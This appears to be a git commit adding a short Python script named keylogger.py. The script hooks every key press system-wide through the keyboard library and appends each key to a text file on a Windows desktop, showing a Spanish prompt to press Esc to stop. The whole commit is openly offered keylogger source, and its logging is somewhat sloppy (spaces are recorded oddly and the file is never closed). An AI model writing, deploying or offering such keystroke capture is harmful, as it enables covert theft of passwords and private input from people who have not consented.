9fe62eb0254a90bd4f7e597ef2aaade97f64b60e
Dv-AlejandroEH <aespher121@gmail.com>
2025-01-27 10:01:44 +0100

    code finised

---
+++ keylogger.py
@@ -0,0 +1,14 @@
+import keyboard
+
+def on_key_event(event):
+    f = open('C:\\Users\\PC03\\Desktop\\entradas.txt', 'a')
+    if event.name == 'space':
+        f.write(' ')
+    f.write(str(event.name))
+    if event.name == 'space':
+        f.write(' ')
+
+keyboard.on_press(on_key_event)
+
+print("Presiona cualquier tecla. Pulsa 'Esc' para salir.")
+keyboard.wait('esc') 
